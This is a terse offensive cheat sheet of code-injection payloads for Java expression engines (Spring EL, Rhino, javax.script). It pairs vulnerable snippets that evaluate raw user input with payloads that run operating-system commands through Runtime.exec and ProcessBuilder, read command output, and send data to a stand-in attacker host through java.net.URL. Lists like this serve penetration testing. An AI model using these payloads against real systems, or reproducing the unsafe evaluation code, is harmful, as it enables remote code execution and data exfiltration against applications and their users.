# Spring EL

```
ExpressionParser parser = new SpelExpressionParser();
StandardEvaluationContext testContext = new StandardEvaluationContext(TEST_PERSON);
Expression exp = parser.parseExpression(user_code);
String valueExtracted = exp.getValue(testContext, String.class);
```
### Runtime

* T(Runtime).getRuntime().exec('open -a Calculator')
* T(java.lang.Runtime).getRuntime().exec('open -a Calculator')

### Process Builder

* new ProcessBuilder({'/bin/bash','-c','open -a Calculator'}).start()
* new java.lang.ProcessBuilder({'/bin/bash','-c','open -a Calculator'}).start()

### Get Output

* (new java.util.Scanner((T(Runtime).getRuntime().exec("ls /").getInputStream()),"UTF-8")).useDelimiter("\\A").next()
* (new java.util.Scanner((T(java.lang.Runtime).getRuntime().exec("ls /").getInputStream()),"UTF-8")).useDelimiter("\\A").next()
* (new java.util.Scanner((new ProcessBuilder({'/bin/bash','-c','ls /'}).start().getInputStream()),"UTF-8")).useDelimiter("\\A").next()

### Exfil

* new java.net.URL("http://atacker/?ex="+DATA).openConnection().getInputStream().readLine()

# Rino Scripting Engine

```
import org.mozilla.javascript.*;
Context cx = Context.enter();
cx.evaluateString(scope, user_code, "", 1, null);
```

# ScriptEngine

```
import javax.script.ScriptEngineManager;
import javax.script.ScriptEngine;
ScriptEngineManager scriptEngineManager = new ScriptEngineManager();
ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension("js");
Object result = scriptEngine.eval(user_code);
```

### Payload

* new java.lang.ProcessBuilder["(java.lang.String[])"](["calc.exe"]).start()
